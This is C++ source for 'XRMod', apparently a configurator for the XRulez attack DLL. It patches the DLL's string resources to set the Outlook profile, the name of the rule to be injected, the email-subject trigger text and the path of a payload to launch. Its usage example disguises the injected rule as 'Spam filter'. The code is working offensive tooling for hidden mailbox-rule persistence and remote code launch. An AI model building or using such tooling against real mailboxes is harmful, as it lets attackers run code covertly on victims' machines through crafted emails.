#include "StdAfx.h"

// Codebox includes.
#include "Application.h"

#define IDS_STRING_PROFILE_NAME 112
#define IDS_STRING_RULE_NAME 128
#define IDS_STRING_TRIGGER_TEXT 144
#define IDS_STRING_PAYLOAD_PATH 160
#define IDS_STRING_RUNNING_AS_WINDOWS_SERVICE 176

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
CppTools::XError<bool> XRMod::Application::Process()
{
	// Validate and resolve command-line parameters.
	auto& commandLineArgs = Enviro::AccessCommandLineParams();

	// Sanity check.
	if (commandLineArgs.size() % 2)
		return ShowUsage(), false;

	// Handle commands separately.
	for (unsigned i = 2; i < commandLineArgs.size(); i += 2)
		if (!HandleSingleCommand(commandLineArgs[1], commandLineArgs[i], commandLineArgs[i + 1]))
			return false;

	// Load the dll.
	auto dll = LoadLibraryExW(commandLineArgs[1].c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE);
	if (!dll)
		return Enviro::wcerr << L"Failed to load specified DLL - " << WinTools::ConvertWinErrorToMessageWithWinError(GetLastError()) << std::endl, false;
	SCOPE_GUARD{ if (!FreeLibrary(dll)) Enviro::wcerr << L"Failed to free the DLL - " << WinTools::ConvertWinErrorToMessageWithWinError(GetLastError()) << std::endl; };

	// Show current values that resides in the DLL.
	wchar_t buffer[275];
	Enviro::cout << "Values residing in the image:" << std::endl;
#	define LOAD_STRING(KEY,VAR) if (LoadStringW(dll, KEY, buffer, static_cast<int>(std::size(buffer)))) { Enviro::wcout << L"\t" << VAR << L" = " << (buffer[0] == L'1' && wcslen(buffer) < 256 ? (L"\"" \
		+ std::wstring(&buffer[1]) + L"\"").c_str() : L"[Unknown value]") << std::endl; } else Enviro::cerr << "Couldn't read " << VAR << " parameter from the DLL." << std::endl;
	LOAD_STRING(IDS_STRING_PROFILE_NAME, L"Profile name");
	LOAD_STRING(IDS_STRING_RULE_NAME, L"Rule name");
	LOAD_STRING(IDS_STRING_TRIGGER_TEXT, L"Trigger text");
	LOAD_STRING(IDS_STRING_PAYLOAD_PATH, L"Path to payload");
#	undef LOAD_STRING

	// Lastly load and parse bool value. Again, first byte indicates if value is utilized or not.
	if (LoadStringW(dll, IDS_STRING_RUNNING_AS_WINDOWS_SERVICE, buffer, static_cast<int>(std::size(buffer))))
		Enviro::cout << "\tIsRunningAsService = " << (buffer[0] == L'1' ? (buffer[1] == L'1' ? "true" : "false") : "[Unknown value]") << std::endl, false;
	else
		Enviro::cerr << "Couldn't read m_IsRunningInWindowsService parameter from the DLL." << std::endl, false;

	return true;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void XRMod::Application::ShowUsage()
{
	Enviro::tcout << APPLICATION_NAME << TEXT(". Usage:"
		"\n\nF:XRMod.exe PathToDll [--profile PROFILE] [--name NAME] [--trigger TRIGGER] [--payload PAYLOAD] [--service SERVICE]"
		"\n\n\tPROFILE - name of Outlook profile used to log in, has to be shorter than 66 characters. If you want to erase profile (to use default profile name by XRulez) use --profile \"\""
		"\n\n\tNAME - this name will be seen on Outlook's rule list after injection. Has to be shorter than 256 characters. Cannot be blank."
		"\n\n\tTRIGGER - text in email subject that triggers payload launching. Has to be shorter than 256 characters. Cannot be blank."
		"\n\n\tPAYLOAD - path to payload. Has to be shorter than 256 characters. Cannot be blank."
		"\n\n\tSERVICE - Windows service flag, should be 1 if run as (or injected to) a Windows Service process. Any other character equals false."
		"\n\nE:XRMod.exe \"C:\\Some folder\\XRulez_rwdi86d.dll\" --name \"Spam filter\"\n"
	) << std::endl;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
CppTools::XError<bool> XRMod::Application::HandleSingleCommand(const std::wstring& pathToImage, const std::wstring& commandKey, const std::wstring& commandValue)
{
	// Handle one single command-line command.
	if (!commandKey.compare(TEXT("--profile")))
		if (commandValue.size() > 65)											//< Validate.
			return Enviro::cerr << "Error: profile name has to less than 256 characters long." << std::endl, false;
		else
			return PatchString(pathToImage, IDS_STRING_PROFILE_NAME, L"1" + commandValue);
	else if (!commandKey.compare(TEXT("--service")))
		if (commandValue.empty())
			return Enviro::cerr << "Error: service flag has be at least one character long." << std::endl, false;
		else
			return PatchString(pathToImage, IDS_STRING_RUNNING_AS_WINDOWS_SERVICE, commandValue[0] == L'1' ? L"11" : L"10");

	// For other cases, use simple macro.
#	ifdef UNICODE
#		define ELSE(text,name,var) else if (!commandKey.compare(TEXT(text))) if (commandValue.size() > 255) return Enviro::cerr << "Error: " name " has to be less than 256 characters long." << std::endl,\
			false; else if (commandValue.empty()) return Enviro::cerr << "Error: " name " has to be non-blank." << std::endl, false; else return PatchString(pathToImage, var, L"1" + commandValue);
#	else
#		error MBCS builds are currently not supported.
#	endif
		ELSE("--name", "rule name", IDS_STRING_RULE_NAME)
		ELSE("--trigger", "trigger text", IDS_STRING_TRIGGER_TEXT)
		ELSE("--payload", "payload path", IDS_STRING_PAYLOAD_PATH)
#	undef ELSE

	// If we're here then an unknown command was used. Show usage and terminate.
	return ShowUsage(), false;
};

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
CppTools::XError<bool> XRMod::Application::PatchString(const std::wstring& pathToImage, unsigned stringId, const std::wstring& stringName)
{
	// String resources are stored in groups of 16, separated by 2-byte length information.	If you are looking for string 100, load resource 7 (100 / 16 + 1) and then skip to 4th(100 % 16) item.
	unsigned resGroup = (stringId >> 4) + 1;

	// We are handling only the string that are first and only in the group.
	CHECK(!(stringId % 16));
	if (stringId % 16)
		return false;

	// Construct the string-group.
	wchar_t buffer[275], *p = &buffer[stringName.size() + 1];
	*reinterpret_cast<uint16_t*>(buffer) = static_cast<uint16_t>(stringName.size());
	wcscpy_s(&buffer[1], 260, stringName.c_str());

	// Add 14*size(wchar_t) zeros (one double-zero is already there because wcscpy_s has copied terminating null character).
	for (unsigned i = 0; i < 14; ++i)
		*++p = L'\0';

	// Open the DLL file.
	auto updateHandle = BeginUpdateResource(pathToImage.c_str(), FALSE);
	if (!updateHandle)
		return Enviro::wcerr << L"Failed to begin updating resource " << stringName.c_str() << L" - " << WinTools::ConvertWinErrorToMessageWithWinError(GetLastError()) << std::endl, false;

	// Add the dialog box resource to the update list.
	if (UpdateResource(updateHandle, RT_STRING, MAKEINTRESOURCE(resGroup), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buffer, static_cast<DWORD>(stringName.size() * sizeof(wchar_t)) + 32))
		return EndUpdateResource(updateHandle, FALSE) ? true : (Enviro::wcerr << L"Failed to free resource update handle for " << stringName.c_str() << L" - "
			<< WinTools::ConvertWinErrorToMessageWithWinError(GetLastError()) << std::endl, false);

	// If were here then something gone wrong.
	Enviro::wcerr << L"Failed to update resource " << stringName.c_str() << L" - " << WinTools::ConvertWinErrorToMessageWithWinError(GetLastError()) << std::endl;
	EndUpdateResource(updateHandle, FALSE);
	return false;
};
